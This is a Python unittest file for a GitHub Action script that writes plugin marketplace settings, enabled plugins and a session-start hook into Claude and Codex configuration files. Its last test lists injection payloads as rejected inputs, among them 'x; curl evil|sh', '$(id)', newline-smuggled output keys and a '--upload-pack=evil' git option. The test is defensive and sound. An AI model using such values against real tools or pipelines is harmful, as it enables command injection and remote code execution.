import json
import os
import re
import shlex
import shutil
import subprocess
import sys
import tempfile
import textwrap
import tomllib
import unittest
from pathlib import Path

SCRIPT = Path(__file__).resolve().parent.parent / "actions" / "update-plugin" / "update_settings.py"
SHA_A = "a" * 40
SHA_B = "b" * 40


class UpdateSettingsTest(unittest.TestCase):
    def setUp(self):
        self.dir = Path(tempfile.mkdtemp())
        self.settings = self.dir / ".claude" / "settings.json"
        self.codex = self.dir / ".codex" / "config.toml"

    def tearDown(self):
        shutil.rmtree(self.dir)

    def run_script(self, sha, plugins="toolkit,oss", *extra):
        out = subprocess.run(
            ["python3", str(SCRIPT), "--settings", str(self.settings), "--marketplace", "cedricziel",
             "--repo", "cedricziel/claude-plugins", "--plugins", plugins, "--sha", sha, *extra],
            capture_output=True, text=True, cwd=self.dir,
        )
        return out, dict(line.split("=", 1) for line in out.stdout.splitlines())

    def read(self):
        return json.loads(self.settings.read_text())

    def test_bootstraps_missing_file(self):
        _, out = self.run_script(SHA_A)
        self.assertEqual((out["changed"], out["bootstrapped"], out["sha"]), ("true", "true", SHA_A))
        cfg = self.read()
        self.assertEqual(
            cfg["extraKnownMarketplaces"]["cedricziel"]["source"],
            {"source": "github", "repo": "cedricziel/claude-plugins", "ref": "main", "sha": SHA_A},
        )
        self.assertEqual(cfg["enabledPlugins"], {"toolkit@cedricziel": True, "oss@cedricziel": True})

    def test_bootstrap_preserves_unrelated_settings(self):
        self.settings.parent.mkdir()
        self.settings.write_text(json.dumps({"enabledPlugins": {"x@y": True}, "model": "opus"}))
        self.run_script(SHA_A)
        cfg = self.read()
        self.assertEqual(cfg["model"], "opus")
        self.assertTrue(cfg["enabledPlugins"]["x@y"])
        self.assertTrue(cfg["enabledPlugins"]["toolkit@cedricziel"])

    def test_updates_sha_only_and_keeps_ref_and_plugins(self):
        self.run_script(SHA_A)
        cfg = self.read()
        cfg["extraKnownMarketplaces"]["cedricziel"]["source"]["ref"] = "v1"
        del cfg["enabledPlugins"]["oss@cedricziel"]
        self.settings.write_text(json.dumps(cfg))

        _, out = self.run_script(SHA_B)
        self.assertEqual((out["changed"], out["bootstrapped"]), ("true", "false"))
        cfg = self.read()
        source = cfg["extraKnownMarketplaces"]["cedricziel"]["source"]
        self.assertEqual((source["sha"], source["ref"]), (SHA_B, "v1"))
        self.assertEqual(cfg["enabledPlugins"], {"toolkit@cedricziel": True})

    def test_noop_when_already_latest(self):
        self.run_script(SHA_A)
        before = self.settings.read_text()
        codex_before = self.codex.read_text()
        _, out = self.run_script(SHA_A)
        self.assertEqual(out["changed"], "false")
        self.assertEqual(self.settings.read_text(), before)
        self.assertEqual(self.codex.read_text(), codex_before)
        self.assertNotIn("codex", out)

    def test_bootstraps_codex_with_public_plugins_at_same_commit(self):
        result, out = self.run_script(SHA_A, "toolkit,oss")
        self.assertEqual(result.returncode, 0, result.stderr)
        cfg = tomllib.loads(self.codex.read_text())
        self.assertEqual(cfg["marketplaces"]["cedricziel"], {
            "source_type": "git",
            "source": "https://github.com/cedricziel/claude-plugins.git",
            "ref": SHA_A,
        })
        self.assertEqual(cfg["plugins"], {
            "common@cedricziel": {"enabled": True},
            "oss@cedricziel": {"enabled": True},
        })
        self.assertEqual(out["codex"], ".codex/config.toml")

    def test_codex_update_preserves_comments_and_explicit_choices(self):
        self.run_script(SHA_A)
        cfg = self.codex.read_text().replace("enabled = true", "enabled = false", 1)
        cfg = '# Keep my settings\nmodel = "custom"\n' + cfg
        cfg += '\n[plugins."other@elsewhere"]\nenabled = true\n'
        self.codex.write_text(cfg)
        result, out = self.run_script(SHA_B)
        self.assertEqual(result.returncode, 0, result.stderr)
        updated = self.codex.read_text()
        parsed = tomllib.loads(updated)
        self.assertIn('# Keep my settings\nmodel = "custom"', updated)
        self.assertFalse(parsed["plugins"]["common@cedricziel"]["enabled"])
        self.assertTrue(parsed["plugins"]["other@elsewhere"]["enabled"])
        self.assertEqual(parsed["marketplaces"]["cedricziel"]["ref"], SHA_B)
        self.assertEqual(out["changed"], "true")

    def test_creates_codex_even_when_existing_settings_are_current(self):
        self.run_script(SHA_A)
        self.codex.unlink()
        result, out = self.run_script(SHA_A)
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assertEqual(out["changed"], "true")
        self.assertTrue(self.codex.is_file())

    def test_codex_can_be_disabled(self):
        result, _ = self.run_script(SHA_A, "oss", "--codex-config=")
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assertFalse(self.codex.exists())

    def test_refuses_conflicting_codex_source_before_writing_settings(self):
        self.codex.parent.mkdir()
        original = '[marketplaces.cedricziel]\nsource_type = "local"\nsource = "/tmp/elsewhere"\n'
        self.codex.write_text(original)
        result, _ = self.run_script(SHA_A)
        self.assertNotEqual(result.returncode, 0)
        self.assertEqual(self.codex.read_text(), original)
        self.assertFalse(self.settings.exists())

    def test_codex_bootstrap_respects_explicit_disabled_plugin(self):
        self.codex.parent.mkdir()
        self.codex.write_text('[plugins."oss@cedricziel"]\nenabled = false\n')
        result, _ = self.run_script(SHA_A, "oss")
        self.assertEqual(result.returncode, 0, result.stderr)
        cfg = tomllib.loads(self.codex.read_text())
        self.assertFalse(cfg["plugins"]["oss@cedricziel"]["enabled"])
        self.assertTrue(cfg["plugins"]["common@cedricziel"]["enabled"])

    def test_codex_update_does_not_restore_removed_plugin(self):
        self.run_script(SHA_A)
        self.codex.write_text(
            '[marketplaces.cedricziel]\nsource_type = "git"\n'
            'source = "https://github.com/cedricziel/claude-plugins.git"\n'
            f'ref = "{SHA_A}"\n'
        )
        result, _ = self.run_script(SHA_B)
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assertNotIn("plugins", tomllib.loads(self.codex.read_text()))

    def test_custom_codex_path_and_plugins(self):
        result, out = self.run_script(
            SHA_A, "oss", "--codex-config=config/agent.toml", "--codex-plugins=common,skills",
        )
        self.assertEqual(result.returncode, 0, result.stderr)
        path = self.dir / out["codex"]
        cfg = tomllib.loads(path.read_text())
        self.assertEqual(set(cfg["plugins"]), {"common@cedricziel", "skills@cedricziel"})
        self.assertFalse(self.codex.exists())

    def test_invalid_codex_leaves_both_configs_unchanged(self):
        self.run_script(SHA_A)
        settings_before = self.settings.read_text()
        self.codex.write_text("[invalid")
        result, _ = self.run_script(SHA_B)
        self.assertNotEqual(result.returncode, 0)
        self.assertEqual(self.settings.read_text(), settings_before)
        self.assertEqual(self.codex.read_text(), "[invalid")

    def run_action(self):
        subprocess.run(["git", "init", "--quiet", "--initial-branch=main", str(self.dir)], check=True)
        bin_dir = self.dir / "bin"
        bin_dir.mkdir()
        git = shlex.quote(shutil.which("git"))
        python = shlex.quote(sys.executable)
        commands = {
            "git": (
                f'if [ "$1" = ls-remote ]; then printf "{SHA_A}\\trefs/heads/main\\n"; exit 0; fi\n'
                'if [ "$1" = push ]; then exit 0; fi\n'
                f'exec {git} "$@"\n'
            ),
            "python3": (
                'if [ "$1" = -m ] && [ "$2" = pip ]; then exit 0; fi\n'
                f'exec {python} "$@"\n'
            ),
            "gh": 'if [ "$2" = create ]; then echo https://example.invalid/pr/1; fi\nexit 0\n',
        }
        for name, script in commands.items():
            path = bin_dir / name
            path.write_text("#!/bin/sh\n" + script)
            path.chmod(0o755)
        output = self.dir / "output"
        env = {
            **os.environ,
            "PATH": f"{bin_dir}:{os.environ['PATH']}",
            "ACTION_PATH": str(SCRIPT.parent), "SETTINGS": ".claude/settings.json",
            "MARKETPLACE": "cedricziel", "REPO": "cedricziel/claude-plugins",
            "PLUGINS": "oss", "REF": "main", "SESSION_HOOK": "true",
            "CODEX_CONFIG": ".codex/config.toml", "CODEX_PLUGINS": "common,oss",
            "GITHUB_OUTPUT": str(output), "BASE": "main", "METHOD": "squash",
            "GIT_CONFIG_GLOBAL": os.devnull, "GIT_CONFIG_NOSYSTEM": "1",
        }
        steps = re.findall(
            r"^      run: \|\n((?:        .*\n|\n)+)",
            SCRIPT.with_name("action.yml").read_text(), re.M,
        )
        self.assertEqual(len(steps), 2)
        result = subprocess.run(
            ["bash", "-c", textwrap.dedent(steps[0])],
            cwd=self.dir, env=env, capture_output=True, text=True,
        )
        self.assertEqual(result.returncode, 0, result.stderr)
        outputs = dict(line.split("=", 1) for line in output.read_text().splitlines())
        if outputs["changed"] == "false":
            return []
        env.update({
            "SETTINGS": outputs.get("settings", ""),
            "SHA": outputs["sha"], "BOOTSTRAPPED": outputs["bootstrapped"],
            "HOOK": outputs.get("hook", ""), "CODEX_CONFIG": outputs.get("codex", ""),
        })
        result = subprocess.run(
            ["bash", "-c", textwrap.dedent(steps[1])],
            cwd=self.dir, env=env, capture_output=True, text=True,
        )
        self.assertEqual(result.returncode, 0, result.stderr)
        return subprocess.run(
            [shutil.which("git"), "show", "--pretty=", "--name-only", "HEAD"],
            cwd=self.dir, capture_output=True, text=True, check=True,
        ).stdout.splitlines()

    def test_action_commits_codex_when_other_config_is_already_current(self):
        self.run_script(SHA_A, "oss", "--codex-config=", "--session-hook")
        files = self.run_action()
        self.assertIn(".codex/config.toml", files)
        cfg = tomllib.loads(self.codex.read_text())
        self.assertNotIn("toolkit@cedricziel", cfg["plugins"])

    def test_action_skips_gitignored_codex_config(self):
        (self.dir / ".gitignore").write_text(".codex/\n")
        files = self.run_action()
        self.assertNotIn(".codex/config.toml", files)
        self.assertFalse(self.codex.exists())

    def test_action_updates_codex_when_other_host_is_gitignored(self):
        (self.dir / ".gitignore").write_text(".claude/\n")
        files = self.run_action()
        self.assertIn(".codex/config.toml", files)
        self.assertFalse(self.settings.exists())

    def test_action_skips_both_ignored_configs_without_a_commit(self):
        (self.dir / ".gitignore").write_text(".claude/\n.codex/\n")
        self.assertEqual(self.run_action(), [])
        self.assertFalse(self.settings.exists())
        self.assertFalse(self.codex.exists())

    def test_refuses_marketplace_pointing_elsewhere(self):
        self.settings.parent.mkdir()
        self.settings.write_text(json.dumps({"extraKnownMarketplaces": {
            "cedricziel": {"source": {"source": "github", "repo": "someone/else"}}}}))
        out, _ = self.run_script(SHA_A)
        self.assertNotEqual(out.returncode, 0)

    def hook_script(self):
        return self.settings.parent / "hooks" / "install-claude-plugins.sh"

    def test_no_hook_by_default(self):
        self.run_script(SHA_A)
        self.assertFalse(self.hook_script().exists())
        self.assertNotIn("hooks", self.read())

    def test_session_hook_installs_enabled_plugins_in_remote_sessions(self):
        _, out = self.run_script(SHA_A, "toolkit,oss", "--session-hook")
        self.assertEqual(out["hook"], str(self.hook_script()))
        script = self.hook_script().read_text()
        self.assertIn('CLAUDE_CODE_REMOTE', script)
        self.assertIn("claude plugin marketplace add cedricziel/claude-plugins", script)
        self.assertIn("claude plugin install toolkit@cedricziel", script)
        self.assertIn("claude plugin install oss@cedricziel", script)
        self.assertTrue(self.hook_script().stat().st_mode & 0o100)
        command = self.read()["hooks"]["SessionStart"][0]["hooks"][0]["command"]
        self.assertEqual(command, f"$CLAUDE_PROJECT_DIR/{self.hook_script()}")

    def test_session_hook_is_idempotent_and_keeps_edits(self):
        self.run_script(SHA_A, "oss", "--session-hook")
        self.hook_script().write_text("#!/bin/bash\n# edited\n")
        _, out = self.run_script(SHA_A, "oss", "--session-hook")
        self.assertEqual(out["changed"], "false")
        self.assertNotIn("hook", out)
        self.assertIn("edited", self.hook_script().read_text())
        self.assertEqual(len(self.read()["hooks"]["SessionStart"]), 1)

    def test_session_hook_added_to_existing_config(self):
        self.run_script(SHA_A, "oss")
        _, out = self.run_script(SHA_A, "oss", "--session-hook")
        self.assertEqual((out["changed"], out["bootstrapped"]), ("true", "false"))
        self.assertTrue(self.hook_script().is_file())

    def test_session_hook_keeps_other_session_start_hooks(self):
        self.settings.parent.mkdir()
        self.settings.write_text(json.dumps({"hooks": {"SessionStart": [
            {"hooks": [{"type": "command", "command": "other.sh"}]}]}}))
        self.run_script(SHA_A, "oss", "--session-hook")
        commands = [h["command"] for g in self.read()["hooks"]["SessionStart"] for h in g["hooks"]]
        self.assertEqual(commands[0], "other.sh")
        self.assertEqual(len(commands), 2)

    def run_raw(self, **overrides):
        args = {"marketplace": "cedricziel", "repo": "cedricziel/claude-plugins",
                "plugins": "oss", "ref": "main", "sha": SHA_A, **overrides}
        cmd = ["python3", str(SCRIPT), "--settings", str(self.settings), "--session-hook"]
        for key, value in args.items():
            cmd += [f"--{key}={value}"]
        return subprocess.run(cmd, capture_output=True, text=True, cwd=self.dir)

    def test_rejects_shell_metacharacters_in_inputs(self):
        for field, value in [
            ("marketplace", "x; curl evil|sh"),
            ("repo", "owner/repo\nhook=evil"),
            ("repo", "no-slash"),
            ("plugins", "oss,$(id)"),
            ("codex-plugins", "common\nchanged=false"),
            ("ref", "--upload-pack=evil"),
            ("ref", "main\nsha=evil"),
            ("sha", "not-a-sha"),
        ]:
            with self.subTest(field=field, value=value):
                out = self.run_raw(**{field: value})
                self.assertNotEqual(out.returncode, 0)
                self.assertEqual(out.stdout, "")
                self.assertFalse(self.settings.exists())


if __name__ == "__main__":
    unittest.main()
